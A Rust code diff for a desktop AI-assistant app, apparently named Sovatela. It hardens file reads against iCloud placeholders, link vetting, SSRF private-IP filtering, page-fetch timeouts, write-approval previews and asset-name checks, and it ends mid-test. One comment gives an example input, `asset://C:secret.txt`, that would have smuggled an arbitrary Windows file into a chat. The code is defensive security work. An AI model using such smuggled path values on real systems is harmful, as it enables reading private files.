@@ -5,6 +5,7 @@ use std::sync::Arc;
 use tauri::ipc::Channel;
 use tauri::Manager;
 
+pub mod cloud;
 pub mod doc_confinement;
 #[cfg(all(windows, feature = "windows-confinement"))]
 pub mod doc_confinement_windows;
@@ -212,6 +213,9 @@ pub const MAX_CONVERSATION_BYTES: usize = 32 * 1024 * 1024;
 /// The length is checked from the directory entry before the bytes are read, so
 /// an oversized file costs a stat rather than the allocation it describes.
 fn read_to_string_capped(path: &std::path::Path, max: usize, what: &str) -> Result<String, String> {
+    if is_cloud_placeholder(path) {
+        return Err(cloud_placeholder_refusal(what));
+    }
     let meta = std::fs::metadata(path).map_err(|e| e.to_string())?;
     if meta.len() as usize > max {
         return Err(format!(
@@ -222,6 +226,52 @@ fn read_to_string_capped(path: &std::path::Path, max: usize, what: &str) -> Resu
         ));
     }
     std::fs::read_to_string(path).map_err(|e| e.to_string())
+}
+
+/// Whether a sync service has moved this file's contents off the Mac.
+///
+/// iCloud Drive, and Dropbox, OneDrive or Google Drive through macOS's File
+/// Provider, can keep a file's name and size here while its contents exist only
+/// in the cloud. Reading one asks macOS to fetch them and blocks until it has.
+/// When the fetch never comes, because the service is offline or paused or the
+/// folder was disconnected from it, the read never returns, and nothing in this
+/// app can cancel a read already inside the kernel. 1.10.3's installed-build
+/// check found the template picker waiting like that, with no message, on a
+/// Desktop file that iCloud had evicted; the same read had been there since
+/// 1.6.0. So a file like this is refused before it is opened, and the refusal
+/// says how to bring it back.
+///
+/// The flag comes from the directory entry, and reading it fetches nothing.
+#[cfg(target_os = "macos")]
+pub(crate) fn is_cloud_placeholder(path: &std::path::Path) -> bool {
+    use std::os::macos::fs::MetadataExt as _;
+    /// `SF_DATALESS` in `<sys/stat.h>`: the file's contents are not on this volume.
+    const SF_DATALESS: u32 = 0x4000_0000;
+    std::fs::metadata(path)
+        .map(|m| m.st_flags() & SF_DATALESS != 0)
+        .unwrap_or(false)
+}
+
+/// Windows and Linux have no equivalent that blocks a read indefinitely: a
+/// OneDrive placeholder that cannot be fetched fails the read with an error.
+#[cfg(not(target_os = "macos"))]
+pub(crate) fn is_cloud_placeholder(_path: &std::path::Path) -> bool {
+    false
+}
+
+/// The refusal for [`is_cloud_placeholder`]. `what` begins the sentence.
+///
+/// It does not offer to fetch the file. Asking macOS to download it would be a
+/// request to a cloud service that this app started, and SECURITY.md lists
+/// everything the app contacts. Finder can do it, and the person can see it
+/// happen there.
+pub(crate) fn cloud_placeholder_refusal(what: &str) -> String {
+    format!(
+        "{what} is stored in iCloud or another cloud service, and its contents are not on \
+         this Mac, so Sovatela did not open it: waiting for the download could have left \
+         the app stuck. In Finder, Control-click the file and choose Download Now (or your \
+         cloud service's option to keep it on this Mac), then try again."
+    )
 }
 
 // Keychain coordinates. macOS asks the user's consent per keychain ITEM and
@@ -719,7 +769,12 @@ fn vetted_external_url(raw: &str) -> Result<String, String> {
     if !parsed.username().is_empty() || parsed.password().is_some() {
         return Err("that link carries a username or password, so it was not opened".into());
     }
-    Ok(trimmed.to_string())
+    // The parsed form, not the string that came in. The parser drops tabs and
+    // newlines and reads `\` as `/`; the system's opener does neither, so
+    // returning the input meant the link opened could differ from the one
+    // checked. No way to exploit that was found, but what is checked should
+    // be what is opened (1.10.2 launch review, S9).
+    Ok(parsed.as_str().to_string())
 }
 
 #[cfg(test)]
@@ -786,6 +841,20 @@ mod external_links {
             vetted_external_url("  https://example.com/  ").unwrap(),
             "https://example.com/"
         );
+    }
+
+    /// S9. What is opened is what was checked: the parser's reading of the
+    /// link, not the text that came in.
+    #[test]
+    fn the_link_opened_is_the_link_checked() {
+        for (given, opened) in [
+            ("https://exa\tmple.com/a", "https://example.com/a"),
+            ("https://example.com/a\nb", "https://example.com/ab"),
+            ("https:\\\\example.com\\path", "https://example.com/path"),
+            ("HTTPS://EXAMPLE.com", "https://example.com/"),
+        ] {
+            assert_eq!(vetted_external_url(given).unwrap(), opened, "{given:?}");
+        }
     }
 }
 
@@ -3396,6 +3465,10 @@ async fn set_template(app: tauri::AppHandle, kind: String) -> Result<Option<Temp
             meta.len() / (1024 * 1024)
         ));
     }
+    // Asked rather than refused: the person has just chosen it. See `cloud`.
+    if !bring_chosen_file_local(&app, &source, &name).await? {
+        return Ok(None);
+    }
 
     // Reading and vetting are file I/O and parsing, which do not belong on the
     // async runtime's threads.
@@ -3460,6 +3533,208 @@ async fn set_template(app: tauri::AppHandle, kind: String) -> Result<Option<Temp
     write_atomic_bytes(&dest, &bytes).map_err(|e| format!("Could not save the template: {e}"))?;
 
     Ok(Some(TemplateInfo { kind, name, added }))
+}
+
+/// For a file the person has just chosen in a dialog opened here: if its
+/// contents are in the cloud, ask whether to download it, and wait while it
+/// does. `Ok(false)` when they said no or cancelled.
+///
+/// Only for a file chosen moments ago. A file the app reaches on its own, such
+/// as the history index or a workspace file the model asked for, is refused by
+/// `is_cloud_placeholder` instead: nobody asked for it to be fetched.
+async fn bring_chosen_file_local(
+    app: &tauri::AppHandle,
+    path: &std::path::Path,
+    name: &str,
+) -> Result<bool, String> {
+    if !is_cloud_placeholder(path) {
+        return Ok(true);
+    }
+    let name_for_messages = name.to_string();
+    let (app, path, name) = (app.clone(), path.to_path_buf(), name.to_string());
+    let outcome = tokio::task::spawn_blocking(move || cloud::bring_local(&app, &[(&path, &name)]))
+        .await
+        .map_err(|e| e.to_string())?;
+    match outcome {
+        cloud::Outcome::Local => Ok(true),
+        // Not now: like closing the picker, nothing to report.
+        cloud::Outcome::Declined => Ok(false),
+        cloud::Outcome::Cancelled => Err(cloud::cancelled(&name_for_messages)),
+        cloud::Outcome::Failed(message) => Err(message),
+    }
+}
+
+/// Stop waiting for a cloud download. The notice the interface shows while
+/// one runs has this as its Cancel button.
+#[tauri::command]
+fn cancel_cloud_download() {
+    cloud::cancel();
+}
+
+/// As many files as a message can carry; the interface's `MAX_ATTACHMENTS`.
+const MAX_PICKED_ATTACHMENTS: usize = 20;
+/// The largest file any attachment kind accepts; the interface's
+/// `MAX_DOC_BYTES`. The interface applies the smaller per-kind limits.
+const MAX_PICKED_ATTACHMENT_BYTES: u64 = 20 * 1024 * 1024;
+
+/// One file chosen to attach: its bytes, or why it was not read.
+#[derive(serde::Serialize, Debug)]
+#[serde(rename_all = "camelCase")]
+struct PickedFile {
+    name: String,
+    mime: String,
+    data_base64: Option<String>,
+    error: Option<String>,
+}
+
+/// Choose files to attach, and read them here.
+///
+/// The picker used to be the window's own `<input type="file">`. That hands
+/// the interface a file's contents and never its path, which is right, but it
+/// also meant the app could not tell a file whose contents were in the cloud
+/// from one that was merely slow: attaching one did nothing at all. Opened
+/// here, as every other picker in this app is, the backend knows the path and
+/// can ask to download the file, and the interface still never names one.
+///
+/// Returns the files for the interface to classify exactly as it classifies a
+/// dropped file, so the per-kind limits and refusals live in one place.
+#[tauri::command]
+async fn pick_attachments(app: tauri::AppHandle) -> Result<Vec<PickedFile>, String> {
+    let picked = tokio::task::spawn_blocking({
+        let app = app.clone();
+        move || {
+            use tauri_plugin_dialog::DialogExt;
+            app.dialog()
+                .file()
+                .set_title("Choose files to attach")
+                .blocking_pick_files()
+        }
+    })
+    .await
+    .map_err(|e| e.to_string())?;
+    let Some(picked) = picked else {
+        return Ok(Vec::new()); // declining the dialog is not a failure
+    };
+    let paths: Vec<std::path::PathBuf> = picked
+        .into_iter()
+        .filter_map(|p| p.into_path().ok())
+        .collect();
+
+    tokio::task::spawn_blocking(move || {
+        let (kept, extra) = paths.split_at(paths.len().min(MAX_PICKED_ATTACHMENTS));
+        let named: Vec<(&std::path::Path, String)> = kept
+            .iter()
+            .map(|p| (p.as_path(), file_name_of(p)))
+            .collect();
+        let refs: Vec<(&std::path::Path, &str)> =
+            named.iter().map(|(p, n)| (*p, n.as_str())).collect();
+        // One question for every evicted file, not one per file.
+        let outcome = cloud::bring_local(&app, &refs);
+        let mut out: Vec<PickedFile> = named
+            .iter()
+            .map(|(path, name)| read_picked_attachment(path, name, &outcome))
+            .collect();
+        if !extra.is_empty() {
+            out.push(PickedFile {
+                name: format!("{} more", extra.len()),
+                mime: String::new(),
+                data_base64: None,
+                error: Some(format!(
+                    "not added — a message can carry {MAX_PICKED_ATTACHMENTS} attachments at most"
+                )),
+            });
+        }
+        out
+    })
+    .await
+    .map_err(|e| e.to_string())
+}
+
+fn file_name_of(path: &std::path::Path) -> String {
+    path.file_name()
+        .map(|n| n.to_string_lossy().into_owned())
+        .unwrap_or_else(|| "file".into())
+}
+
+/// Read one chosen file, or say why not. `cloud` is how asking to download
+/// the evicted ones ended; a file still evicted is never read.
+fn read_picked_attachment(
+    path: &std::path::Path,
+    name: &str,
+    cloud: &cloud::Outcome,
+) -> PickedFile {
+    use base64::Engine as _;
+    let refuse = |why: String| PickedFile {
+        name: name.to_string(),
+        mime: String::new(),
+        data_base64: None,
+        error: Some(why),
+    };
+    let meta = match std::fs::metadata(path) {
+        Ok(m) => m,
+        Err(_) => return refuse("could not read".into()),
+    };
+    if !meta.is_file() {
+        return refuse("is a folder, not a file".into());
+    }
+    if meta.len() > MAX_PICKED_ATTACHMENT_BYTES {
+        return refuse(format!(
+            "file too large (max {} MB)",
+            MAX_PICKED_ATTACHMENT_BYTES / (1024 * 1024)
+        ));
+    }
+    if is_cloud_placeholder(path) {
+        return refuse(match cloud {
+            cloud::Outcome::Failed(message) => message.clone(),
+            cloud::Outcome::Cancelled => "not attached — the download was cancelled. macOS may \
+                still finish it in the background; attach the file again once it has."
+                .into(),
+            _ => "not attached — it is stored in the cloud and was not downloaded".into(),
+        });
+    }
+    let mut bytes = Vec::new();
+    let read = std::fs::File::open(path).and_then(|f| {
+        std::io::Read::read_to_end(
+            &mut std::io::Read::take(f, MAX_PICKED_ATTACHMENT_BYTES + 1),
+            &mut bytes,
+        )
+    });
+    if read.is_err() {
+        return refuse("could not read".into());
+    }
+    if bytes.len() as u64 > MAX_PICKED_ATTACHMENT_BYTES {
+        return refuse("file too large (max 20 MB)".into());
+    }
+    PickedFile {
+        name: name.to_string(),
+        mime: attachment_mime(name).to_string(),
+        data_base64: Some(base64::engine::general_purpose::STANDARD.encode(&bytes)),
+        error: None,
+    }
+}
+
+/// The type the window's own picker would have given, for the extensions the
+/// interface treats differently: an image is sent as a picture, anything else
+/// is classified by name. Empty for the rest, as a browser leaves it.
+fn attachment_mime(name: &str) -> &'static str {
+    let lower = name.to_lowercase();
+    let ext = lower.rsplit_once('.').map_or("", |(_, e)| e);
+    match ext {
+        "png" => "image/png",
+        "jpg" | "jpeg" => "image/jpeg",
+        "gif" => "image/gif",
+        "webp" => "image/webp",
+        "heic" => "image/heic",
+        "bmp" => "image/bmp",
+        "tif" | "tiff" => "image/tiff",
+        "svg" => "image/svg+xml",
+        "pdf" => "application/pdf",
+        "txt" => "text/plain",
+        "md" => "text/markdown",
+        "csv" => "text/csv",
+        "json" => "application/json",
+        _ => "",
+    }
 }
 
 /// The templates currently in use, for Settings to display.
@@ -5100,6 +5375,12 @@ fn is_private_ip(ip: std::net::IpAddr) -> bool {
                 || (seg[0] & 0xffc0) == 0xfe80 // link local fe80::/10
                 || seg[..6] == [0, 0, 0, 0, 0, 0] // deprecated IPv4-compatible ::/96
                 || seg[..6] == [0x64, 0xff9b, 0, 0, 0, 0] // NAT64 64:ff9b::/96 embeds V4
+                // Added after the 1.10.2 launch review (S11):
+                || (seg[0] & 0xffc0) == 0xfec0 // site-local fec0::/10: deprecated, still routed on some LANs
+                || seg[0] == 0x2002 // 6to4 2002::/16 carries an IPv4 address inside it
+                || seg[..2] == [0x2001, 0] // Teredo 2001::/32 carries IPv4 addresses too
+                || seg[..2] == [0x2001, 0x0db8] // documentation 2001:db8::/32
+                || seg[..3] == [0x64, 0xff9b, 1] // local-use NAT64 64:ff9b:1::/48
         }
     }
 }
@@ -5202,6 +5483,36 @@ fn parse_tool_args(raw: &str) -> Option<serde_json::Value> {
         .filter(|v| v.is_object())
 }
 
+/// The longest a page read may take in all.
+///
+/// The client's 60-second limit is per read, so a page that sends a little
+/// just before each one could hold a turn open until the size cap, minutes
+/// on a slow drip (1.10.2 launch review, S11).
+const FETCH_DEADLINE: std::time::Duration = std::time::Duration::from_secs(45);
+
+/// `fut`, or a refusal naming what took too long once `limit` has passed.
+async fn within_deadline<T>(
+    limit: std::time::Duration,
+    what: &str,
+    fut: impl std::future::Future<Output = Result<T, String>>,
+) -> Result<T, String> {
+    tokio::time::timeout(limit, fut).await.unwrap_or_else(|_| {
+        Err(format!(
+            "{what} took longer than {} seconds, so it was stopped",
+            limit.as_secs()
+        ))
+    })
+}
+
+async fn fetch_page(url: &str) -> Result<String, String> {
+    within_deadline(
+        FETCH_DEADLINE,
+        "reading that page",
+        fetch_page_unbounded(url),
+    )
+    .await
+}
+
 /// The agent's page reader: fetch a URL and return readable text (HTML is
 /// converted, plain text/JSON passes through). Every hop — the initial URL
 /// and each redirect — is resolved and vetted by `vetted_ip`, and the
@@ -5209,7 +5520,7 @@ fn parse_tool_args(raw: &str) -> Option<serde_json::Value> {
 /// redirect nor a rebinding DNS answer can route the request into private
 /// space. Redirects are therefore followed manually: reqwest's redirect
 /// policy can't do async resolution.
-async fn fetch_page(url: &str) -> Result<String, String> {
+async fn fetch_page_unbounded(url: &str) -> Result<String, String> {
     let mut current = reqwest::Url::parse(url.trim()).map_err(|_| "invalid URL".to_string())?;
     let mut resp = None;
     for _hop in 0..6 {
@@ -5598,7 +5909,8 @@ async fn execute_tool<R: tauri::Runtime>(
                 .as_ref()
                 .map(|(_, doc, _)| doc.len())
                 .unwrap_or(content.len());
-            let approved = confirm_write(ctx.app, &path, verb, bytes);
+            let preview = write_preview(content, built.is_some());
+            let approved = confirm_write(ctx.app, &path, verb, bytes, &preview);
             if !approved {
                 let _ = on_event.send(StreamEvent::Status(format!("✋ Write declined: {path}")));
                 return format!(
@@ -5643,6 +5955,53 @@ async fn execute_tool<R: tauri::Runtime>(
     }
 }
 
+/// How the content of a workspace write begins, for its approval dialog.
+///
+/// The dialog named the file and its size and nothing else, so approving a
+/// write meant approving content nobody had seen (1.10.2 launch review, S10).
+/// A few short lines are enough to tell a note from a script. Characters that
+/// could disguise the text are replaced, so the preview cannot be used to
+/// spoof the dialog it sits in.
+fn write_preview(content: &str, built: bool) -> String {
+    const LINES: usize = 6;
+    const WIDTH: usize = 80;
+    let shown: Vec<String> = content
+        .lines()
+        .take(LINES)
+        .map(|line| {
+            let clean: String = line
+                .chars()
+                .map(|c| {
+                    if workspace::is_disguising(c) && c != '\t' {
+                        '\u{FFFD}'
+                    } else {
+                        c
+                    }
+                })
+                .collect();
+            if clean.chars().count() > WIDTH {
+                format!("{}…", clean.chars().take(WIDTH).collect::<String>())
+            } else {
+                clean
+            }
+        })
+        .collect();
+    let more = content.lines().count() > LINES;
+    let intro = if built {
+        "It will be built from text that begins:"
+    } else {
+        "It begins:"
+    };
+    if shown.iter().all(|l| l.trim().is_empty()) {
+        return "It is empty, or begins with blank lines.".into();
+    }
+    format!(
+        "{intro}\n{}{}",
+        shown.join("\n"),
+        if more { "\n…" } else { "" }
+    )
+}
+
 /// Native, blocking confirm dialog for a workspace write. Runs on this request's
 /// task; the Tauri event loop (main thread) drives the dialog, so the UI stays
 /// responsive. Returns true only if the user approves.
@@ -5651,14 +6010,16 @@ fn confirm_write<R: tauri::Runtime>(
     path: &str,
     verb: &str,
     bytes: usize,
+    preview: &str,
 ) -> bool {
     use tauri_plugin_dialog::{DialogExt, MessageDialogButtons, MessageDialogKind};
     app.dialog()
         .message(format!(
-            "The assistant wants to {} “{}” in your workspace folder ({} bytes).",
+            "The assistant wants to {} “{}” in your workspace folder ({} bytes).\n\n{}",
             verb.to_lowercase(),
             path,
-            bytes
+            bytes,
+            preview
         ))
         .title(format!("{verb} this file?",))
         .kind(MessageDialogKind::Warning)
@@ -7321,28 +7682,55 @@ fn externalize_assets(
     Ok(())
 }
 
+/// Whether `name` is one this conversation wrote: `{safe_id}-` and the 16 hex
+/// digits of `externalize_assets`, the only shape there has ever been.
+///
+/// Anything else is refused, not just anything path-like. The check used to
+/// refuse `/`, `\` and `..`, which left `C:secret.txt`: on Windows, joining a
+/// drive-relative name *replaces* the base path, so an imported chat holding
+/// `asset://C:secret.txt` would have read that file from the drive's current
+/// directory into the conversation, and from there to the model (1.10.2
+/// launch review, S8). The prefix also stops a chat naming another chat's
+/// images.
+fn is_own_asset_name(name: &str, safe_id: &str) -> bool {
+    let Some(hash) = name
+        .strip_prefix(safe_id)
+        .and_then(|rest| rest.strip_prefix('-'))
+    else {
+        return false;
+    };
+    hash.len() == 16 && hash.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
+}
+
 /// Resolve `asset://` references back to their inline data. A missing asset
 /// file leaves the reference in place (a broken image, not a broken chat).
-fn inline_assets(v: &mut serde_json::Value, dir: &std::path::Path) {
+fn inline_assets(v: &mut serde_json::Value, dir: &std::path::Path, safe_id: &str) {
     match v {
         serde_json::Value::String(s) => {
             if let Some(name) = s.strip_prefix("asset://") {
-                // Names are generated sanitized; refuse anything path-like.
-                if !name.contains('/') && !name.contains('\\') && !name.contains("..") {
-                    if let Ok(data) = std::fs::read_to_string(assets_dir_of(dir).join(name)) {
-                        *v = serde_json::Value::String(data);
+                let assets = assets_dir_of(dir);
+                let path = assets.join(name);
+                // The second half is belt and braces: no name that passes the
+                // first can leave the folder.
+                if is_own_asset_name(name, safe_id) && path.parent() == Some(assets.as_path()) {
+                    // An evicted image is left as a reference, like a missing
+                    // one: a broken image rather than a chat that never opens.
+                    if !is_cloud_placeholder(&path) {
+                        if let Ok(data) = std::fs::read_to_string(path) {
+                            *v = serde_json::Value::String(data);
+                        }
                     }
                 }
             }
         }
         serde_json::Value::Array(items) => {
             for item in items {
-                inline_assets(item, dir);
+                inline_assets(item, dir, safe_id);
             }
         }
         serde_json::Value::Object(map) => {
             for (_, item) in map {
-                inline_assets(item, dir);
+                inline_assets(item, dir, safe_id);
             }
         }
         _ => {}
@@ -7574,7 +7962,15 @@ struct ConversationHeader {
 const CONV_INDEX_FILE: &str = "index.json";
 
 fn read_conv_index(dir: &std::path::Path) -> Vec<ConversationMeta> {
-    std::fs::read_to_string(dir.join(CONV_INDEX_FILE))
+    let path = dir.join(CONV_INDEX_FILE);
+    // A history folder in iCloud Drive can have its index evicted. Waiting for
+    // it would leave the sidebar empty for as long as the download takes, or
+    // forever. Treated as absent instead: `list_conversations` rebuilds the
+    // index from the chat files that are here.
+    if is_cloud_placeholder(&path) {
+        return Vec::new();
+    }
+    std::fs::read_to_string(path)
         .ok()
         .and_then(|s| serde_json::from_str::<Vec<ConversationMeta>>(&s).ok())
         .unwrap_or_default()
@@ -7748,7 +8144,13 @@ async fn list_conversations(app: tauri::AppHandle) -> Result<Vec<ConversationMet
     // the index are read (normally none — save/delete keep it current); the
     // one-time rebuild happens when the index doesn't exist yet.
     let (out, changed) = reconcile_conv_index(&file_stems, read_conv_index(&dir), |stem| {
-        let s = std::fs::read_to_string(dir.join(format!("{stem}.json"))).ok()?;
+        let path = dir.join(format!("{stem}.json"));
+        // Left out until it is downloaded, as an unreadable file already is;
+        // the next listing reads it once its contents are back.
+        if is_cloud_placeholder(&path) {
+            return None;
+        }
+        let s = std::fs::read_to_string(path).ok()?;
         let h: ConversationHeader = serde_json::from_str(&s).ok()?;
         Some(ConversationMeta {
             id: h.id,
@@ -8169,6 +8571,12 @@ async fn import_conversation(app: tauri::AppHandle) -> Result<Option<Conversatio
         return Ok(None); // declining the dialog is not a failure
     };
 
+    let name = path
+        .file_name()
+        .map_or("that chat".into(), |n| n.to_string_lossy());
+    if !bring_chosen_file_local(&app, &path, &name).await? {
+        return Ok(None);
+    }
     let raw = read_to_string_capped(&path, MAX_CONVERSATION_BYTES, "That chat")?;
     let v: serde_json::Value = serde_json::from_str(&raw).map_err(|e| {
         // The likeliest mis-click by a distance, because it is the *other* file
@@ -8474,7 +8882,11 @@ async fn load_conversation(app: tauri::AppHandle, id: String) -> Result<Conversa
             c.schema, CONV_SCHEMA_VERSION
         ));
     }
-    inline_assets(&mut c.messages, &conversations_dir(&app)?);
+    inline_assets(
+        &mut c.messages,
+        &conversations_dir(&app)?,
+        &sanitize_id(&id)?,
+    );
     Ok(c)
 }
 
@@ -9419,6 +9831,56 @@ mod tests {
     ///
     ///   cargo test --manifest-path src-tauri/Cargo.toml --lib \
     ///     office_oracle_fixtures -- --ignored --nocapture
+    /// Documents built from real templates, for `scripts/office-oracle.sh`
+    /// to open in Word. Validation proves a document is well formed; only Word
+    /// shows whether it opens without a repair prompt and lays out as it
+    /// should. Added when four of Word's own templates became usable (R8 of
+    /// the 1.10.2 launch review) and none of the documents built from them
+    /// had been opened.
+    ///
+    /// ```text
+    /// SOVATELA_TEMPLATES="$(printf '%s\n' a.dotx b.dotx)" \
+    ///   cargo test --lib word_template_fixtures -- --ignored
+    /// ```
+    #[test]
+    #[ignore = "needs SOVATELA_TEMPLATES, a newline-separated list of .dotx/.docx paths"]
+    fn word_template_fixtures() {
+        let list = std::env::var("SOVATELA_TEMPLATES").expect("SOVATELA_TEMPLATES");
+        let out = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+            .join("../qa/office-oracle/out/templates");
+        std::fs::create_dir_all(&out).expect("create out dir");
+        let markdown =
+            "# Quarterly review\n\nAn opening paragraph in the template's body style.\n\n\
+            ## Figures\n\n| Region | Share |\n|---|---|\n| EU | 60% |\n| US | 25% |\n\n\
+            ### Steps\n\n1. First step\n2. Second step\n\n- A bullet\n- Another bullet\n\n\
+            > A quotation, in whatever the template calls one.\n";
+        for path in list.lines().map(str::trim).filter(|l| !l.is_empty()) {
+            let path = std::path::Path::new(path);
+            let bytes = std::fs::read(path).expect("read template");
+            let name = path.file_name().unwrap().to_string_lossy().into_owned();
+            // The folder above names the language for Word's localised copies.
+            let lang = path
+                .ancestors()
+                .find_map(|a| {
+                    a.file_name()?
+                        .to_str()?
+                        .strip_suffix(".lproj")
+                        .map(String::from)
+                })
+                .unwrap_or_default();
+            let template = ooxml::template::accept(&name, &bytes)
+                .unwrap_or_else(|e| panic!("{name} was refused: {e}"));
+            let doc = ooxml::docx::from_markdown_with(Some(&template), markdown).unwrap();
+            let stem = name.trim_end_matches(".dotx").trim_end_matches(".docx");
+            let file = if lang.is_empty() {
+                format!("{stem}.docx")
+            } else {
+                format!("{stem}-{lang}.docx")
+            };
+            std::fs::write(out.join(file), doc).expect("write fixture");
+        }
+    }
+
     #[test]
     #[ignore]
     fn office_oracle_fixtures() {
@@ -10034,6 +10496,176 @@ mod tests {
             checked >= 5,
             "found only {checked} commands that open a dialog"
         );
+    }
+
+    /// Every read of a file that a person picked, or that lives in a folder
+    /// they chose and that may be synced, asks first whether its contents are
+    /// on the Mac. Reading a cloud placeholder can block forever.
+    #[test]
+    fn reads_of_chosen_and_synced_files_refuse_cloud_placeholders() {
+        let lib = lib_source();
+        let workspace = include_str!("workspace.rs").replace("\r\n", "\n");
+        // Assembled so that this test's own text is not a match.
+        let check = concat!("is_cloud_", "placeholder(");
+        let reads: [(&str, &str); 8] = [
+            (&lib, "fn read_to_string_capped("),
+            (&lib, "fn bring_chosen_file_local("),
+            (&lib, "fn read_picked_attachment("),
+            (&lib, "fn read_conv_index("),
+            (&lib, "fn list_conversations("),
+            (&lib, "fn inline_assets("),
+            (&workspace, "pub fn read_bytes("),
+            (&workspace, "pub fn read_file("),
+        ];
+        for (src, needle) in reads {
+            let at = src
+                .find(needle)
+                .unwrap_or_else(|| panic!("{needle} is gone; update this list"));
+            let body = &src[at..at + src[at..].find("\n}\n").unwrap_or(src.len() - at)];
+            assert!(
+                body.contains(check),
+                "{needle} reads a file without checking whether its contents are on this Mac"
+            );
+        }
+        // A file the person has just chosen is offered for download rather
+        // than refused, and only those: everything above refuses.
+        let ask = concat!("bring_chosen_file_", "local(");
+        for chooser in ["fn set_template(", "fn import_conversation("] {
+            let at = lib
+                .find(chooser)
+                .unwrap_or_else(|| panic!("{chooser} is gone"));
+            let body = &lib[at..at + lib[at..].find("\n}\n").unwrap()];
+            assert!(
+                body.contains(ask),
+                "{chooser} reads a chosen file without asking first"
+            );
+        }
+        let at = lib
+            .find("fn pick_attachments(")
+            .expect("pick_attachments is gone");
+        let body = &lib[at..at + lib[at..].find("\n}\n").unwrap()];
+        assert!(
+            body.contains(concat!("cloud::bring_", "local(")),
+            "pick_attachments reads chosen files without asking first"
+        );
+        // Chat import, opening a chat and renaming one all read through the
+        // capped reader, which is what lets the list above stay short.
+        for caller in [
+            "fn import_conversation(",
+            "fn load_conversation(",
+            "fn rename_conversation(",
+        ] {
+            let at = lib
+                .find(caller)
+                .unwrap_or_else(|| panic!("{caller} is gone"));
+            let body = &lib[at..at + lib[at..].find("\n}\n").unwrap()];
+            assert!(
+                body.contains("read_to_string_capped("),
+                "{caller} no longer reads through read_to_string_capped"
+            );
+        }
+    }
+
+    #[test]
+    fn an_ordinary_file_is_not_a_cloud_placeholder() {
+        let dir = temp_dir("placeholder");
+        let file = dir.join("ordinary.txt");
+        std::fs::write(&file, "on this Mac").unwrap();
+        assert!(!is_cloud_placeholder(&file));
+        assert!(!is_cloud_placeholder(&dir.join("missing.txt")));
+        assert_eq!(
+            read_to_string_capped(&file, 1024, "This").unwrap(),
+            "on this Mac"
+        );
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn a_picked_attachment_is_read_or_refused_with_a_reason() {
+        use base64::Engine as _;
+        let dir = temp_dir("picked");
+        let file = dir.join("notes.txt");
+        std::fs::write(&file, "hello").unwrap();
+        let got = read_picked_attachment(&file, "notes.txt", &cloud::Outcome::Local);
+        assert_eq!(got.error, None);
+        assert_eq!(got.mime, "text/plain");
+        let bytes = base64::engine::general_purpose::STANDARD
+            .decode(got.data_base64.unwrap())
+            .unwrap();
+        assert_eq!(bytes, b"hello");
+
+        let folder = read_picked_attachment(&dir, "picked", &cloud::Outcome::Local);
+        assert_eq!(folder.error.as_deref(), Some("is a folder, not a file"));
+        assert!(folder.data_base64.is_none());
+
+        let big = dir.join("big.pdf");
+        let f = std::fs::File::create(&big).unwrap();
+        f.set_len(MAX_PICKED_ATTACHMENT_BYTES + 1).unwrap();
+        let got = read_picked_attachment(&big, "big.pdf", &cloud::Outcome::Local);
+        assert_eq!(got.error.as_deref(), Some("file too large (max 20 MB)"));
+        assert!(got.data_base64.is_none());
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn a_picked_image_is_typed_as_one_and_the_rest_by_name() {
+        assert_eq!(attachment_mime("Photo.JPG"), "image/jpeg");
+        assert_eq!(attachment_mime("chart.png"), "image/png");
+        assert_eq!(attachment_mime("report.pdf"), "application/pdf");
+        assert_eq!(attachment_mime("letter.docx"), "");
+        assert_eq!(attachment_mime("README"), "");
+    }
+
+    #[test]
+    fn the_placeholder_refusal_says_how_to_get_the_file_back() {
+        let m = cloud_placeholder_refusal("“house-style.docx”");
+        assert!(m.starts_with("“house-style.docx” is stored in iCloud"));
+        assert!(m.contains("Download Now"), "{m}");
+        assert!(m.contains("try again"), "{m}");
+    }
+
+    /// Against a real evicted file, which a test cannot make: File Provider
+    /// decides what to evict. Run it by hand with a file that `stat -f %Sf`
+    /// shows as `dataless`:
+    ///
+    /// ```text
+    /// SOVATELA_DATALESS_FILE=~/Desktop/x.docx cargo test placeholder_is_refused -- --ignored
+    /// ```
+    ///
+    /// A regression shows up as a hang rather than a failure, because the read
+    /// it exists to prevent never returns.
+    #[test]
+    #[ignore = "needs a dataless file named in SOVATELA_DATALESS_FILE"]
+    #[cfg(target_os = "macos")]
+    fn a_real_cloud_placeholder_is_refused_without_reading_it() {
+        let path = std::path::PathBuf::from(
+            std::env::var("SOVATELA_DATALESS_FILE").expect("SOVATELA_DATALESS_FILE"),
+        );
+        assert!(
+            is_cloud_placeholder(&path),
+            "{} is not dataless",
+            path.display()
+        );
+        let err = read_to_string_capped(&path, MAX_CONVERSATION_BYTES, "That file").unwrap_err();
+        assert!(err.contains("stored in iCloud"), "{err}");
+        let root = path.parent().unwrap();
+        let name = path.file_name().unwrap().to_str().unwrap();
+        let err = workspace::read_bytes(root, name).unwrap_err();
+        assert!(err.contains("stored in iCloud"), "{err}");
+        let err = workspace::read_file(root, name).unwrap_err();
+        assert!(err.contains("stored in iCloud"), "{err}");
+        // The paperclip: each way of not downloading is reported, and the
+        // file is never read.
+        for (outcome, says) in [
+            (cloud::Outcome::Declined, "was not downloaded"),
+            (cloud::Outcome::Cancelled, "the download was cancelled"),
+            (cloud::Outcome::Failed("gave up".into()), "gave up"),
+        ] {
+            let got = read_picked_attachment(&path, name, &outcome);
+            assert!(got.data_base64.is_none(), "{outcome:?} read the file");
+            let err = got.error.unwrap_or_default();
+            assert!(err.contains(says), "{outcome:?}: {err}");
+        }
     }
 
     #[test]
@@ -11022,7 +11654,7 @@ mod tests {
         // Content-addressed: the same image is stored once.
         assert_eq!(std::fs::read_dir(assets_dir_of(&dir)).unwrap().count(), 1);
 
-        inline_assets(&mut messages, &dir);
+        inline_assets(&mut messages, &dir, "conv1");
         assert_eq!(messages, original);
 
         delete_assets_of(&dir, "conv1");
@@ -11228,13 +11860,56 @@ mod tests {
     #[test]
     fn inline_assets_leaves_missing_refs_alone() {
         let dir = temp_dir("missing");
-        let mut v = serde_json::json!({ "image": "asset://conv1-doesnotexist" });
-        inline_assets(&mut v, &dir);
-        assert_eq!(v["image"], "asset://conv1-doesnotexist");
+        let mut v = serde_json::json!({ "image": "asset://conv1-0123456789abcdef" });
+        inline_assets(&mut v, &dir, "conv1");
+        assert_eq!(v["image"], "asset://conv1-0123456789abcdef");
         // Path-like names are refused outright.
